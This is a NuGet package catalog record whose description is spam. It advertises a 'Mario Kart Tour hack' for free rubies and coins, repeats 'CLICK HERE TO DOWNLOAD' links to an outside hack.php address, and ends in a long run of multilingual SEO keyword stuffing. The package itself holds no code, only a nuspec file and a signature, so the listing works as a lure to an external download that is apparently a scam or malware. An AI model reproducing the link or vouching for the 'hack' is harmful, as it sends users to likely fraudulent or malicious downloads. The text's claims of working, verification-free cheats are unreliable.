{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.31.23/_mario-kart-tour-hack-working-2022-version-snp.7.4.77.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "5ba2a13a-5a0f-4bf4-ae33-63f7d6b3a427",
  "catalog:commitTimeStamp": "2022-01-26T16:31:23.9193532Z",
  "created": "2022-01-26T16:29:01.99Z",
  "description": "# _Mario Kart Tour hack Working 2022 Version snp\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://11.bltadwin.ru/hack.php](http://11.bltadwin.ru/hack.php)\n\n\nUsing Mario Kart Tour Hack iOS without human verification for free ruby and coins rush. Mario Kart Tour Cheat Codes and Tips that actual working in. A Mario Kart Tour Hack is any modification, tools, app, method or means of gaining unfair advantages and cheats in the game. Mario Kart Tour Hack - With our absolutely free Mario Kart Tour hacks and cheats, you could certainly receive limitless amount of resources on any action.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://11.bltadwin.ru/hack.php](http://11.bltadwin.ru/hack.php)\n\n · Lеаrn Hоw tо Hасk download mario kart tour Prоvіdе cheat tооl tо gеt % coin and ruby. Link: download Mario Kart Tour hack no verification - Mario Kart Tour hack without human verification Mario Kart Tour.  · Mario Kart Tour hack, you will have ways to unlock all of the drivers and other activities without paying. A third-party programmer has changed the source code of this match. Primarily because of.\n\nmario kart tour hack ios, mario kart tour hack no verification, mario kart tour hacks reddit, mario kart tour hackers, mario kart tour hack tutorial, mario kart tour hack unlimited rubies ios, mario kart tour hack unlimited rubies, mario kart tour hack apk, mario kart tour hack reddit, mario kart tour hack ipa, mario kart tour hack android, mario kart tour hack apk ios, mario kart tour hack apk 2021, mario kart tour hack apk 2.6.2, mario kart tour hacks and cheats, mario kart tour hack download android, mario kart tour mod apk hack unlimited rubies, mario kart tour hack no human verification, mario kart tour hack no survey, mario kart tour hacks iphone, mario kart tour bot hack, mario kart tour hack.com, mario kart tour coin hack, mario kart tour cydia hack, can you hack mario kart tour, conseguir rubies mario kart tour hack, mario kart tour hack download, mario kart tour hack download ios, mario kart tour hack deutsch ohne verification, discord mario kart tour hack, pase dorado mario kart tour hack, hack de mario kart tour, mario kart tour hack der funktioniert, mario kart tour hack erfahrungen, mario kart tour hack forum, mario kart tour frenzy hack, mario kart tour infinite frenzy hack, mario kart tour item frenzy hack, mario kart tour gold pass free hack, mario kart tour free rubies hack, hack for mario kart tour, ruby hack for mario kart tour, mario kart tour hack generator, mario kart tour gem hack, mario kart tour gold pipe hack, mario kart tour gold pass hack, how to get rubies mario kart tour hack, rubies gratis mario kart tour hack, mario kart tour gemme hack, mario kart tour hack without human verification, mario kart tour rubies hack no human verification, how to hack mario kart tour, how to hack mario kart tour on iphone, can you cheat in mario kart tour, mario kart tour hack iosgods, mario kart tour hack ios download, mario kart tour hack iphone, mario kart tour item hack, mario kart tour ios hack no jailbreak, mario kart tour hack jailbreak, mario kart tour hack no jailbreak, mario kart tour hacks, mario kart tour hack mod apk, mario kart tour hack mod, mario kart tour multiplayer hack, mario kart tour mobile hack, mario kart tour money hack, mario kart tour multiplayer hackers, mario kart tour hack apk mediafıre, mario kart tour rubies hack no verification, mario kart tour hack online, mario kart tour hack ohne abo, mario kart tour hack ohne verification, mario kart tour rubine hack ohne verifizierung, mario kart tour pipe hack, mario kart tour pc hack, hack para mario kart tour, mario kart tour hack rubies apk, mario kart tour hack rubies sin verificación, mario kart tour hack rubine, mario kart tour rubies hack reddit, r/mario kart tour, mario kart tour hacks no verification, mario kart tour hacks ios, mario kart tour hacks 2020, mario kart tour speed hack, super mario kart tour hack, are there any che",
  "id": "_Mario-Kart-Tour-hack-Working-2022-Version-snp",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T16:31:03.013Z",
  "listed": true,
  "packageHash": "tuG1nUdoebQQ89vz4+VRg69oJy31EvE5blqKxSVHkd6UQovl0SvyNBHqGR8QsVCSqhvlY5qUW65RVJ1adDw3eQ==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11421,
  "published": "2022-01-26T16:29:01.99Z",
  "requireLicenseAcceptance": false,
  "title": "_Mario-Kart-Tour-hack-Working-2022-Version-snp",
  "verbatimVersion": "7.4.77",
  "version": "7.4.77",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.31.23/_mario-kart-tour-hack-working-2022-version-snp.7.4.77.json#ybkbmhcvcz.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1290,
      "fullName": "ybkbmhcvcz.nuspec",
      "length": 4480,
      "name": "ybkbmhcvcz.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.31.23/_mario-kart-tour-hack-working-2022-version-snp.7.4.77.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9471,
      "fullName": ".signature.p7s",
      "length": 9471,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}